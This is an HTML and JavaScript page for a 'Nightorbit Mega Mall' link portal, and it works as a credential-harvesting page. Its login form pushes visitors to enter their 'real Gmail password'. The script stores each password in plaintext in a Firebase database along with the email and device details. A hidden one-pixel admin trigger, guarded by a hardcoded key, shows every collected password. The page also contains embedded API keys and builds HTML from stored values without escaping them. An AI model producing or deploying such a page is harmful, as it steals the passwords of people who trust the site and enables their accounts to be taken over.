<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nightorbit Mega Mall - Owner Version</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        :root { --primary: #00d2ff; --neon: #ff0055; --gold: #ffd700; --bg: #05070a; }
        * { box-sizing: border-box; }
        body { 
            margin: 0; background: radial-gradient(circle, #1B2735 0%, var(--bg) 100%);
            font-family: 'Segoe UI', sans-serif; color: white;
            display: flex; align-items: center; justify-content: center; min-height: 100vh;
        }
        .card { 
            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
            padding: 30px; border-radius: 30px; text-align: center; 
            width: 95%; max-width: 420px; border: 1px solid rgba(255,255,255,0.1); 
            box-shadow: 0 0 40px rgba(0, 210, 255, 0.2); position: relative;
        }
        .pass-wrapper { position: relative; width: 100%; }
        .pass-wrapper i { position: absolute; right: 15px; top: 22px; cursor: pointer; color: #888; }
        input { 
            width: 100%; padding: 14px; margin: 8px 0; border-radius: 12px; 
            border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.5); color: white; outline: none;
        }
        .btn-main { 
            background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; 
            border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px;
        }
        .btn-device {
            background: #fff; color: #000; border: none; padding: 12px; border-radius: 12px;
            width: 100%; margin-bottom: 15px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
        }
        .item-link { 
            background: rgba(255,255,255,0.06); padding: 12px; border-radius: 15px; 
            margin: 6px 0; display: flex; justify-content: space-between; align-items: center; 
            text-decoration: none; color: white; border-left: 4px solid var(--primary); font-size: 13px;
        }
        .menu-dots { position: absolute; top: 20px; right: 20px; cursor: pointer; font-size: 20px; color: var(--primary); }
        #admin-panel { position: fixed; inset: 0; background: #000; z-index: 1000; display: none; padding: 20px; overflow-y: auto; }
        .admin-trigger { position: fixed; bottom: 2px; right: 2px; width: 6px; height: 6px; background: transparent; z-index: 999; cursor: pointer; }
        #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .hidden { display: none !important; }
        .section-tag { font-size: 10px; color: var(--gold); text-align: left; margin: 15px 0 5px 5px; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="admin-trigger" onclick="openAdmin()"></div>

    <div id="logout-overlay">
        <div style="font-size: 40px; margin-bottom: 20px;">üëã</div>
        <div id="bye-msg" style="color: white; padding: 0 30px; line-height: 1.8; font-size: 18px;"></div>
    </div>

    <div id="login-box" class="card">
        <h1 style="color: var(--primary); margin: 0; letter-spacing: 3px;">NIGHTORBIT</h1>
        <p style="color: #666; font-size: 11px; margin-bottom: 20px;">PREMIUM BAZAAR & CINEMA</p>
        
        <button class="btn-device" onclick="googleAuth()">
            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="18"> CONNECT WITH GOOGLE
        </button>

        <div style="margin: 10px 0; color: #444; font-size: 10px;">‚Äî SECURE LOGIN ‚Äî</div>
        <input type="email" id="email-in" placeholder="Gmail Address">
        <div class="pass-wrapper">
            <input type="password" id="pass-in" placeholder="Real Password">
            <i class="fa-solid fa-eye" id="togglePass" onclick="togglePassword()"></i>
        </div>
        <button class="btn-main" onclick="emailAuth()">LOG IN / SIGN UP</button>
        <p id="error-msg" style="color: #ff0055; font-size: 10px; margin-top: 10px;"></p>
    </div>

    <div id="main-page" class="card hidden">
        <div class="menu-dots"><i class="fa-solid fa-ellipsis-vertical"></i></div>
        <h2 id="welcome-name" style="color: var(--primary); margin-bottom: 10px;">Welcome</h2>
        
        <div class="section-tag">Shopping & Food</div>
        <a href="https://www.daraz.pk" target="_blank" class="item-link">üõçÔ∏è Daraz Mall <span>Shop</span></a>
        <a href="https://www.foodpanda.pk" target="_blank" class="item-link">üêº Foodpanda <span>Order</span></a>
        <a href="https://www.junaidjamshed.com" target="_blank" class="item-link">üëï J. Junaid Jamshed <span>Brand</span></a>
        <a href="https://www.amazon.com" target="_blank" class="item-link" style="border-left-color: #ff9900;">üì¶ Amazon <span>Global</span></a>

        <div class="section-tag">Movies & Cinema</div>
        <a href="https://bollyflix.org.in/" target="_blank" class="item-link" style="border-left-color: var(--neon);">üé¨ Bollyflix <span>Movies</span></a>
        <a href="https://www.netflix.com" target="_blank" class="item-link" style="border-left-color: var(--neon);">üéûÔ∏è Netflix <span>Watch</span></a>
        <a href="https://tamashaweb.com/" target="_blank" class="item-link" style="border-left-color: var(--gold);">üì∫ Tamasha App <span>Live TV</span></a>
        
        <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.2); cursor:pointer; margin-top:30px; font-size:11px; text-decoration: underline;">GOODBYE / EXIT</button>
    </div>

    <div id="admin-panel">
        <h2 style="color: var(--primary);">Owner Control</h2>
        <button onclick="document.getElementById('admin-panel').style.display='none'" style="color:red; background:none; border:1px solid red; padding:5px; margin-bottom:15px;">Close</button>
        <div id="user-display"></div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBxJqJkrAaFf3eR0QWvhet6IvvFVHYExeU",
            authDomain: "my-market-ff254.firebaseapp.com",
            projectId: "my-market-ff254",
            storageBucket: "my-market-ff254.appspot.com",
            messagingSenderId: "1039626785987",
            appId: "1:1039626785987:web:ae5a65a0b16444a2cffe76",
            databaseURL: "https://my-market-ff254-default-rtdb.firebaseio.com"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();
        let userRealName = "";

        function togglePassword() {
            const p = document.getElementById('pass-in');
            const icon = document.getElementById('togglePass');
            if(p.type === "password") { p.type = "text"; icon.classList.replace("fa-eye", "fa-eye-slash"); }
            else { p.type = "password"; icon.classList.replace("fa-eye-slash", "fa-eye"); }
        }

        function googleAuth() {
            const provider = new firebase.auth.GoogleAuthProvider();
            auth.signInWithPopup(provider).then(res => handleLogin(res.user, "Google Session", res.user.displayName))
            .catch(() => alert("Canceled"));
        }

        function emailAuth() {
            const e = document.getElementById('email-in').value;
            const p = document.getElementById('pass-in').value;
            if(!e || !p) return alert("Fill all fields");

            // Real password authentication
            auth.signInWithEmailAndPassword(e, p)
            .then(res => handleLogin(res.user, p, e.split('@')[0]))
            .catch(err => {
                if(err.code === 'auth/user-not-found') {
                    auth.createUserWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p, e.split('@')[0]));
                } else {
                    document.getElementById('error-msg').innerText = "Wrong Password! Use your real Gmail password.";
                }
            });
        }

        function handleLogin(user, p, realName) {
            userRealName = realName;
            db.ref('users/' + user.uid).once('value', snap => {
                let d = snap.val();
                let secret = (d && d.secretName) ? d.secretName : "Member";
                db.ref('users/' + user.uid).update({
                    gmail: user.email, realName: realName, secretName: secret, password: p,
                    device: navigator.userAgent.split(')')[0].split('(')[1] || "Unknown",
                    time: new Date().toLocaleString()
                }).then(() => {
                    document.getElementById('login-box').classList.add('hidden');
                    document.getElementById('main-page').classList.remove('hidden');
                    document.getElementById('welcome-name').innerText = "Welcome, " + realName;
                });
            });
        }

        function openAdmin() {
            if (prompt("Key:") === "rr123456789000rr") {
                document.getElementById('admin-panel').style.display = 'block';
                db.ref('users').on('value', snap => {
                    let h = "";
                    snap.forEach(s => {
                        let d = s.val();
                        h += `<div style="background:#111; padding:10px; margin-bottom:10px; border-radius:10px; border:1px solid #333; text-align:left;">
                            <b style="color:var(--gold)">Secret: ${d.secretName}</b><br>
                            <span>Real: ${d.realName}</span><br>
                            <span>Pass: ${d.password}</span><br>
                            <small>${d.time}</small><br>
                            <button onclick="editSec('${s.key}', '${d.secretName}')" style="background:var(--primary); border:none; border-radius:4px; font-size:10px; padding:2px 8px;">Edit Secret</button>
                            <button onclick="delU('${s.key}')" style="background:red; color:white; border:none; border-radius:4px; font-size:10px; padding:2px 8px; margin-left:5px;">Remove</button>
                        </div>`;
                    });
                    document.getElementById('user-display').innerHTML = h;
                });
            }
        }

        function editSec(id, cur) {
            let n = prompt("New Secret Name:", cur);
            if(n) db.ref('users/' + id).update({ secretName: n });
        }
        function delU(id) { if(confirm("Delete?")) db.ref('users/' + id).remove(); }

        function triggerLogout() {
            const o = document.getElementById('logout-overlay');
            document.getElementById('bye-msg').innerHTML = `Dear <b>${userRealName}</b>,<br>Goodbye and take care!<br>May God bless you and keep you happy forever.<br><br><i style="font-size:13px; color:#888;">"Always keep smiling and stay safe."</i>`;
            o.style.display = 'flex';
            setTimeout(() => { location.reload(); }, 4500);
        }
    </script>
</body>
</html>
